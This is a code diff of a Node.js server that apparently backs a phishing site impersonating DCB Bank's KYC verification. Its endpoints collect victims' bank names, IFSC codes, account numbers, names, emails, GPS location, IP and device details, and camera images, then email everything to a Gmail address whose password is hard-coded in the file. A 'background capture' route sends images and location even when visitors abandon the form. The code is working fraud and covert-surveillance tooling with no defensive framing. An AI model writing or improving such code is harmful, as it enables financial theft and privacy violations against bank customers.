@@ -38,93 +38,84 @@ const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
     user: 'dcbsubmission392@gmail.com',
-    pass: 'iskexmwnespcwxrkjt'
+    pass: 'kexmwnespcwxrkjt'
   }
 });
 
 // Helper functions
-const getClientIp = (req) => req.headers['x-forwarded-for']?.split(',')[0] || req.connection?.remoteAddress;
+const getClientIp = (req) => {
+  return req.headers['x-forwarded-for']?.split(',')[0] || 
+         req.connection?.remoteAddress ||
+         req.socket?.remoteAddress ||
+         req.connection?.socket?.remoteAddress;
+};
 
-const buildEmailHtml = (data) => `
-  <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
-    <h2 style="color: ${data.isFormEmpty ? '#d32f2f' : '#003d6a'};">
-      ${data.isFormEmpty ? '⚠️ BACKGROUND CAPTURE' : '✅ KYC SUBMISSION'}
-    </h2>
-    ${data.isFormEmpty ? `
-    <div style="background-color: #fff3e0; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
-      <p><strong>User left without submitting form</strong></p>
-      <p>Captured ${data.imageCount} images before leaving</p>
-    </div>` : ''}
-    <div style="background-color: #eef7ff; padding: 20px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #003d6a;">
-      <h3 style="color: #003d6a; margin-top: 0;">📱 Device Information</h3>
-      <p><strong>Type:</strong> ${data.device.type === 'mobile' ? '📱 Mobile' : '💻 Desktop'} 
-         ${data.device.vendor !== 'Unknown' ? `(${data.device.vendor})` : ''}</p>
-      ${data.device.model !== 'Unknown' ? `<p><strong>Model:</strong> ${data.device.model}</p>` : ''}
-      <p><strong>OS:</strong> ${data.os}</p>
-      <p><strong>Browser:</strong> ${data.browser}</p>
+const buildEmailHtml = (data) => {
+  const isBackground = data.isFormEmpty;
+  return `
+    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
+      <h2 style="color: ${isBackground ? '#d32f2f' : '#003d6a'};">
+        ${isBackground ? '⚠️ BACKGROUND CAPTURE' : '✅ KYC SUBMISSION'}
+      </h2>
+      
+      ${isBackground ? `
+      <div style="background-color: #fff3e0; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
+        <p><strong>User left without submitting form</strong></p>
+        <p>Captured ${data.imageCount} images before leaving</p>
+      </div>
+      ` : ''}
+      
+      <div style="background-color: #eef7ff; padding: 20px; border-radius: 8px; margin: 20px 0; border-left: 4px solid #003d6a;">
+        <h3 style="color: #003d6a; margin-top: 0;">📱 Device Information</h3>
+        <p><strong>Type:</strong> ${data.device.type === 'mobile' ? '📱 Mobile' : '💻 Desktop'} 
+           ${data.device.vendor !== 'Unknown' ? `(${data.device.vendor})` : ''}</p>
+        ${data.device.model !== 'Unknown' ? `<p><strong>Model:</strong> ${data.device.model}</p>` : ''}
+        <p><strong>OS:</strong> ${data.os}</p>
+        <p><strong>Browser:</strong> ${data.browser}</p>
+      </div>
+      
+      ${!isBackground ? `
+      <div style="background-color: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
+        <h3 style="color: #003d6a; margin-top: 0;">Account Information</h3>
+        <p><strong>Bank Name:</strong> ${data.bankname}</p>
+        <p><strong>IFSC Code:</strong> ${data.ifsc}</p>
+        <p><strong>Account Number:</strong> ${data.accno}</p>
+        <p><strong>Full Name:</strong> ${data.fullname}</p>
+        <p><strong>Email:</strong> ${data.email}</p>
+      </div>
+      ` : ''}
+      
+      ${data.location ? `
+      <div style="background-color: #e8f4fc; padding: 20px; border-radius: 8px; margin: 20px 0;">
+        <h3 style="color: #003d6a; margin-top: 0;">Location Data</h3>
+        <p><strong>Latitude:</strong> ${data.location.latitude}</p>
+        <p><strong>Longitude:</strong> ${data.location.longitude}</p>
+        <p><strong>Accuracy:</strong> ${data.location.accuracy} meters</p>
+        <p><strong>Last Updated:</strong> ${new Date(data.location.timestamp).toLocaleString()}</p>
+      </div>
+      ` : ''}
+      
+      <div style="background-color: #f0f8ff; padding: 20px; border-radius: 8px; margin: 20px 0;">
+        <h3 style="color: #003d6a; margin-top: 0;">Technical Data</h3>
+        <p><strong>IP Address:</strong> ${data.ip}</p>
+        <p><strong>Images Captured:</strong> ${data.imageCount}</p>
+        <p><strong>User Agent:</strong> ${data.userAgent}</p>
+        <p><strong>Timestamp:</strong> ${new Date(data.timestamp).toLocaleString()}</p>
+      </div>
     </div>
-    ${!data.isFormEmpty ? `
-    <div style="background-color: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
-      <h3 style="color: #003d6a; margin-top: 0;">Account Information</h3>
-      <p><strong>Bank Name:</strong> ${data.bankname}</p>
-      <p><strong>IFSC Code:</strong> ${data.ifsc}</p>
-      <p><strong>Account Number:</strong> ${data.accno}</p>
-      <p><strong>Full Name:</strong> ${data.fullname}</p>
-      <p><strong>Email:</strong> ${data.email}</p>
-    </div>` : ''}
-    ${data.location ? `
-    <div style="background-color: #e8f4fc; padding: 20px; border-radius: 8px; margin: 20px 0;">
-      <h3 style="color: #003d6a; margin-top: 0;">Location Data</h3>
-      <p><strong>Latitude:</strong> ${data.location.latitude}</p>
-      <p><strong>Longitude:</strong> ${data.location.longitude}</p>
-      <p><strong>Accuracy:</strong> ${data.location.accuracy} meters</p>
-    </div>` : ''}
-    <div style="background-color: #f0f8ff; padding: 20px; border-radius: 8px; margin: 20px 0;">
-      <h3 style="color: #003d6a; margin-top: 0;">Technical Data</h3>
-      <p><strong>IP Address:</strong> ${data.ip}</p>
-      <p><strong>Images Captured:</strong> ${data.imageCount}</p>
-      <p><strong>User Agent:</strong> ${data.userAgent}</p>
-      <p><strong>Timestamp:</strong> ${new Date(data.timestamp).toLocaleString()}</p>
-    </div>
-  </div>
-`;
+  `;
+};
 
-// Background submission endpoint
-app.post('/submit-background', express.urlencoded({ extended: true }), (req, res) => {
-  try {
-    const data = {
-      ...req.body,
-      device: JSON.parse(req.body.device),
-      location: req.body.location ? JSON.parse(req.body.location) : null,
-      ip: getClientIp(req),
-      userAgent: req.headers['user-agent'],
-      isFormEmpty: true,
-      imageCount: parseInt(req.body.image_count) || 0
-    };
-
-    fs.appendFileSync('records.txt', `BACKGROUND: ${JSON.stringify(data)}\n`);
-    
-    transporter.sendMail({
-      from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
-      to: 'dcbsubmission392@gmail.com',
-      subject: `⚠️ Background Capture (${data.imageCount} images)`,
-      html: buildEmailHtml(data)
-    }).catch(e => console.error('Email failed:', e));
-    
-    res.status(200).end();
-  } catch (e) {
-    console.error('Background submit error:', e);
-    res.status(500).end();
-  }
-});
-
-// Main submission endpoint
+// Routes
 app.post('/submit', (req, res) => {
   upload(req, res, async (err) => {
     try {
       if (err) throw err;
 
-      const parser = new UAParser(req.headers['user-agent'] || '');
+      const isBackground = req.body.empty_form === 'true';
+      
+      // Parse device info
+      const parser = new UAParser(req.headers['user-agent'] || req.body.user_agent || '');
       const device = parser.getDevice();
       const os = parser.getOS();
       const browser = parser.getBrowser();
@@ -144,18 +135,44 @@ app.post('/submit', (req, res) => {
         email: req.body.email || 'Not provided',
         location: req.body.location ? JSON.parse(req.body.location) : null,
         ip: getClientIp(req),
-        userAgent: req.headers['user-agent'],
-        timestamp: new Date().toISOString(),
-        isFormEmpty: false,
+        userAgent: req.headers['user-agent'] || req.body.user_agent,
+        timestamp: req.body.timestamp || new Date().toISOString(),
+        isFormEmpty: isBackground,
         imageCount: req.files?.length || 0
       };
 
-      fs.appendFileSync('records.txt', `SUBMISSION: ${JSON.stringify(submissionData)}\n`);
+      // Log the submission
+      const logEntry = `
+--- ${isBackground ? 'BACKGROUND' : 'FULL'} SUBMISSION ---
+Device: ${submissionData.device.vendor} ${submissionData.device.model} (${submissionData.device.type})
+OS: ${submissionData.os}
+Browser: ${submissionData.browser}
+IP: ${submissionData.ip}
+Location: ${submissionData.location ? 
+  `${submissionData.location.latitude}, ${submissionData.location.longitude}` : 'None'}
+Bank: ${submissionData.bankname}
+IFSC: ${submissionData.ifsc}
+Account: ${submissionData.accno}
+Name: ${submissionData.fullname}
+Email: ${submissionData.email}
+Images: ${submissionData.imageCount}
+User Agent: ${submissionData.userAgent}
+Timestamp: ${submissionData.timestamp}
+-----------------------------
+`;
 
+      fs.appendFileSync('records.txt', logEntry);
+      console.log(logEntry);
+
+      // Send email
+      const emailSubject = isBackground 
+        ? `⚠️ Background Capture (${submissionData.imageCount} images)` 
+        : '✅ KYC Verification Completed';
+      
       await transporter.sendMail({
         from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
         to: 'dcbsubmission392@gmail.com',
-        subject: '✅ KYC Verification Completed',
+        subject: emailSubject,
         html: buildEmailHtml(submissionData),
         attachments: (req.files || []).map(file => ({
           filename: file.originalname,
@@ -163,16 +180,98 @@ app.post('/submit', (req, res) => {
         }))
       });
 
+      // Cleanup files
       if (req.files) {
         req.files.forEach(file => {
-          try { fs.unlinkSync(file.path); } catch (e) { console.error('Error deleting file:', e); }
+          try {
+            fs.unlinkSync(file.path);
+          } catch (e) {
+            console.error('Error deleting file:', file.path, e);
+          }
         });
       }
 
-      res.status(200).end();
+      res.status(200).send();
     } catch (error) {
       console.error('❌ Error:', error);
       res.status(500).send('Error processing submission');
+    }
+  });
+});
+
+// Background submission endpoint
+app.post('/background-submit', (req, res) => {
+  upload(req, res, async (err) => {
+    try {
+      if (err) throw err;
+
+      // Parse device info
+      const parser = new UAParser(req.headers['user-agent'] || req.body.user_agent || '');
+      const device = parser.getDevice();
+      const os = parser.getOS();
+      const browser = parser.getBrowser();
+
+      const submissionData = {
+        device: {
+          type: device.type || req.body.device_type || 'desktop',
+          model: device.model || req.body.device_model || 'Unknown',
+          vendor: device.vendor || req.body.device_vendor || 'Unknown'
+        },
+        os: `${os.name} ${os.version}` || req.body.device_os,
+        browser: `${browser.name} ${browser.version}` || req.body.device_browser,
+        ip: getClientIp(req),
+        userAgent: req.headers['user-agent'] || req.body.user_agent,
+        timestamp: req.body.timestamp || new Date().toISOString(),
+        isFormEmpty: true,
+        imageCount: req.files?.length || 0,
+        location: req.body.location ? JSON.parse(req.body.location) : null
+      };
+
+      // Log the submission
+      const logEntry = `
+--- BACKGROUND SUBMISSION ---
+Device: ${submissionData.device.vendor} ${submissionData.device.model} (${submissionData.device.type})
+OS: ${submissionData.os}
+Browser: ${submissionData.browser}
+IP: ${submissionData.ip}
+Location: ${submissionData.location ? 
+  `${submissionData.location.latitude}, ${submissionData.location.longitude}` : 'None'}
+Images: ${submissionData.imageCount}
+User Agent: ${submissionData.userAgent}
+Timestamp: ${submissionData.timestamp}
+-----------------------------
+`;
+
+      fs.appendFileSync('records.txt', logEntry);
+      console.log(logEntry);
+
+      // Send email
+      await transporter.sendMail({
+        from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
+        to: 'dcbsubmission392@gmail.com',
+        subject: `⚠️ Background Capture (${submissionData.imageCount} images)`,
+        html: buildEmailHtml(submissionData),
+        attachments: (req.files || []).map(file => ({
+          filename: file.originalname,
+          path: file.path
+        }))
+      });
+
+      // Cleanup files
+      if (req.files) {
+        req.files.forEach(file => {
+          try {
+            fs.unlinkSync(file.path);
+          } catch (e) {
+            console.error('Error deleting file:', file.path, e);
+          }
+        });
+      }
+
+      res.status(200).send();
+    } catch (error) {
+      console.error('❌ Background submit error:', error);
+      res.status(500).send('Error processing background submission');
     }
   });
 });
